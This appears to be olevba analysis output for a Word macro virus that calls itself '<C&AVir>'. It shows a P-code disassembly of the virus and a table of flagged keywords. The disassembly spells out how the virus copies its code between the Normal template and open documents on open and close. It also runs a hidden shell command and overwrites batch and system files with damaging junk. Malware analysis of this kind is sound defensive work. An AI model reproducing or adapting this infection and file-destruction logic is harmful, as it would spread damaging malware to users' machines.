' 	ArgsMemLd Item 0x0001 
' 	MemLd With 
' 	St twori 
' Line #119:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Height 
' 	St thori 
' Line #120:
' 	Ld twori 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt With 
' Line #121:
' 	Ld thori 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Height 
' Line #122:
' 	LitStr 0x0007 "Ja! Ja!"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Caption 
' Line #123:
' 	LitStr 0x0007 "This Is"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Caption 
' Line #124:
' 	LitStr 0x0008 "<C&AVir>"
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Caption 
' Line #125:
' 	LitStr 0x0014 "Rebizar Hortogrhafia"
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Caption 
' Line #126:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #127:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #128:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #129:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #130:
' 	Ld ActiveDocument 
' 	MemLd Paragraphs 
' 	MemLd Count 
' 	St x 
' Line #131:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #132:
' 	Ld wdAlignParagraphRight 
' 	Ld R 
' 	Ld ActiveDocument 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemSt Alignment 
' Line #133:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	NextVar 
' Line #134:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #135:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #136:
' 	Ld Options 
' 	MemLd CheckSpellingAsYouType 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CheckSpellingAsYouType 
' 	EndIf 
' Line #137:
' 	Ld ActiveDocument 
' 	MemLd ShowSpellingErrors 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' 	EndIf 
' Line #138:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #139:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #140:
' 	LitVarSpecial (False)
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #141:
' 	LitDI2 0x0041 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt With 
' Line #142:
' 	LitDI2 0x0041 
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Height 
' Line #143:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #144:
' 	Ld Date 
' 	LitDI4 0x8EAF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #145:
' 	LitStr 0x0081 " All sistems and mainframes aren't capaple to support the new era of the year 2000 or Y2K, The disaster is possible by this cause"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #146:
' 	ElseBlock 
' Line #147:
' 	LitStr 0x0049 " The End of World is near, you can prevent make the LOVE not the war !!!."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndSelect 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld Activa_Pln 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitStr 0x002C "command.com /c dir \*.dll/s/o/b>>\IODocs.dll"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #155:
' 	LitStr 0x000B "\IODocs.dll"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #156:
' 	LitStr 0x000B "\IODocs.dll"
' 	Ld vbHidden 
' 	ArgsCall SetAttr 0x0002 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #159:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #160:
' 	LitStr 0x001E "Make The Love!! Not The War !!"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #161:
' 	Ld pnomus 
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #162:
' 	LitStr 0x0025 "ALT + <F4>, <CTRL>+<ALT>+<SUPR>, <F1>"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' Line #163:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #164:
' 	EndWith 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #167:
' 	LitStr 0x000C "\IOBuff1.vxd"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #168:
' 	LitStr 0x000C "\IOBuff1.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #169:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #170:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #171:
' 	LitDI2 0x0001 
' 	Ld docum 
' 	LineInput 
' Line #172:
' 	LitVarSpecial (False)
' 	St Encue 
' Line #173:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #174:
' 	Ld doc 
' 	MemLd New 
' 	Ld docum 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Encue 
' 	EndIf 
' Line #175:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #176:
' 	Ld Encue 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #177:
' 	Ld docum 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #178:
' 	ElseBlock 
' Line #179:
' 	Ld docum 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	Loop 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #184:
' 	LitStr 0x000C "\IOBuff1.vxd"
' 	ArgsCall Kill 0x0001 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	LitStr 0x000C "\IOBuff2.vxd"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #187:
' 	LitStr 0x000C "\IOBuff2.vxd"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #188:
' 	LitDI2 0x0002 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #189:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #190:
' 	LitDI2 0x0002 
' 	Ld Pabt 
' 	LineInput 
' Line #191:
' 	Ld Pabt 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #192:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "REM ** This Bat File Has Violed By <C&AVir>"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "REM ** Your PC Is Not Secure System"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "prompt Fuck You!!$g"
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "command.com"
' 	PrintItemNL 
' Line #197:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #198:
' 	Loop 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #201:
' 	LitStr 0x000C "\IOBuff2.vxd"
' 	ArgsCall Kill 0x0001 
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	LitStr 0x000C "\IOBuff3.vxd"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #204:
' 	LitStr 0x000C "\IOBuff3.vxd"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #205:
' 	LitDI2 0x0004 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #206:
' 	LitDI2 0x0004 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #207:
' 	LitDI2 0x0004 
' 	Ld Pasy 
' 	LineInput 
' Line #208:
' 	Ld Pasy 
' 	LitDI2 0x0005 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #209:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "REM   Warning In the file "
' 	Ld Pasy 
' 	Concat 
' 	LitStr 0x0002 "!!"
' 	Concat 
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "REM   This Sys File can only operate with"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "REM   Operating Systems Powerfull and Secures"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "REM   <C&AVir>."
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "FILES = 1"
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "BUFFERS = 1"
' 	PrintItemNL 
' Line #215:
' 	LitDI2 0x0005 
' 	Sharp 
' 	Close 0x0001 
' Line #216:
' 	Loop 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #219:
' 	LitStr 0x000C "\IOBuff3.vxd"
' 	ArgsCall Kill 0x0001 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	LitStr 0x000C "\IOBuff4.vxd"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #222:
' 	LitStr 0x000C "\IOBuff4.vxd"
' 	LitDI2 0x0006 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #223:
' 	LitDI2 0x0006 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #224:
' 	LitDI2 0x0006 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #225:
' 	LitDI2 0x0006 
' 	Ld Pain 
' 	LineInput 
' Line #226:
' 	Ld Pain 
' 	LitDI2 0x0007 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #227:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "**********************************************************"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "     Warning!: The File: "
' 	Ld Pain 
' 	Concat 
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "     Is Damaged. I`m Sorry!"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "**********************************************************"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 " "
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0007 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Reinstall Your System..."
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0007 
' 	Sharp 
' 	Close 0x0001 
' Line #234:
' 	Loop 
' Line #235:
' 	LitDI2 0x0006 
' 	Sharp 
' 	Close 0x0001 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	LitStr 0x000C "\IOBuff4.vxd"
' 	ArgsCall Kill 0x0001 
' Line #238:
' 	EndIfBlock 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	LitVarSpecial (False)
' 	St Rompe 
' Line #241:
' 	Ld LinDoc 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #242:
' 	Ld Rompe 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #243:
' 	Ld Rnd 
' 	Ld LinDoc 
' 	Mul 
' 	FnInt 
' 	St Compara 
' Line #244:
' 	Ld Compara 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Compara 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	Ld Compara 
' 	LitDI2 0x0140 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #245:
' 	LitVarSpecial (True)
' 	St Rompe 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	Wend 
' Line #248:
' 	ElseBlock 
' Line #249:
' 	Ld Rompe 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #250:
' 	Ld Rnd 
' 	Ld LinPln 
' 	Mul 
' 	FnInt 
' 	St Compara 
' Line #251:
' 	Ld Compara 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Compara 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	Ld Compara 
' 	LitDI2 0x0140 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #252:
' 	LitVarSpecial (True)
' 	St Rompe 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	Wend 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	Ld Compara 
' 	LitDI2 0x0001 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LCPln 
' Line #257:
' 	Ld Compara 
' 	LitDI2 0x0001 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LCDoc 
' Line #258:
' 	QuoteRem 0x0002 0x001E "Validar Estado de la Plantilla"
' Line #259:
' 	Ld Sw_Pln_Infec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #260:
' 	Ld LinPln 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #261:
' 	Ld LCPln 
' 	Ld LCDoc 
' 	Ne 
' 	IfBlock 
' Line #262:
' 	LitDI2 0x0001 
' 	Ld LinPln 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #263:
' 	LitDI2 0x0001 
' 	St Accion1 
' Line #264:
' 	ElseBlock 
' Line #265:
' 	Ld LinPln 
' 	Ld LinDoc 
' 	Ne 
' 	IfBlock 
' Line #266:
' 	LitDI2 0x0001 
' 	Ld LinPln 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #267:
' 	LitDI2 0x0001 
' 	St Accion1 
' Line #268:
' 	ElseBlock 
' Line #269:
' 	LitDI2 0x0002 
' 	St Accion1 
' Line #270:
' 	EndIfBlock 
' Line #271:
' 	EndIfBlock 
' Line #272:
' 	ElseBlock 
' Line #273:
' 	LitDI2 0x0001 
' 	St Accion1 
' Line #274:
' 	EndIfBlock 
' Line #275:
' 	ElseBlock 
' Line #276:
' 	LitDI2 0x0002 
' 	St Accion1 
' Line #277:
' 	EndIfBlock 
' Line #278:
' 	QuoteRem 0x0002 0x001C "Validar Estado del Documento"
' Line #279:
' 	Ld Sw_Doc_Infec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #280:
' 	Ld LinDoc 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #281:
' 	Ld LCDoc 
' 	Ld LCPln 
' 	Ne 
' 	IfBlock 
' Line #282:
' 	LitDI2 0x0001 
' 	Ld LinDoc 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #283:
' 	LitDI2 0x0001 
' 	St Accion2 
' Line #284:
' 	ElseBlock 
' Line #285:
' 	Ld LinDoc 
' 	Ld LinPln 
' 	Ne 
' 	IfBlock 
' Line #286:
' 	LitDI2 0x0001 
' 	Ld LinDoc 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #287:
' 	LitDI2 0x0001 
' 	St Accion2 
' Line #288:
' 	ElseBlock 
' Line #289:
' 	LitDI2 0x0002 
' 	St Accion2 
' Line #290:
' 	EndIfBlock 
' Line #291:
' 	EndIfBlock 
' Line #292:
' 	ElseBlock 
' Line #293:
' 	LitDI2 0x0001 
' 	St Accion2 
' Line #294:
' 	EndIfBlock 
' Line #295:
' 	ElseBlock 
' Line #296:
' 	LitDI2 0x0002 
' 	St Accion2 
' Line #297:
' 	EndIfBlock 
' Line #298:
' 	Ld Accion1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0016 0x0012 "Infectar Plantilla"
' Line #299:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinDoc 
' 	For 
' Line #300:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St linwork 
' Line #301:
' 	Ld R 
' 	Ld linwork 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #302:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	NextVar 
' Line #303:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #304:
' 	LitDI2 0x000D 
' 	LitStr 0x0012 "Activa_Doc = False"
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #305:
' 	LitDI2 0x000E 
' 	LitStr 0x0011 "Activa_Pln = True"
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #306:
' 	Ld pnomus 
' 	Ld Application 
' 	MemSt UserName 
' Line #307:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #308:
' 	EndIfBlock 
' Line #309:
' 	Ld Accion2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0016 0x0019 "Infectar Documento Activo"
' Line #310:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LinPln 
' 	For 
' Line #311:
' 	Ld R 
' 	LitDI2 0x0001 
' 	Ld Pl 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St linwork 
' Line #312:
' 	Ld R 
' 	Ld linwork 
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #313:
' 	StartForVariable 
' 	Ld R 
' 	EndForVariable 
' 	NextVar 
' Line #314:
' 	LitDI2 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #315:
' 	LitDI2 0x000D 
' 	LitStr 0x0011 "Activa_Doc = True"
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #316:
' 	LitDI2 0x000E 
' 	LitStr 0x0012 "Activa_Pln = False"
' 	Ld Dc 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #317:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #318:
' 	EndIfBlock 
' Line #319:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |IODocs.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

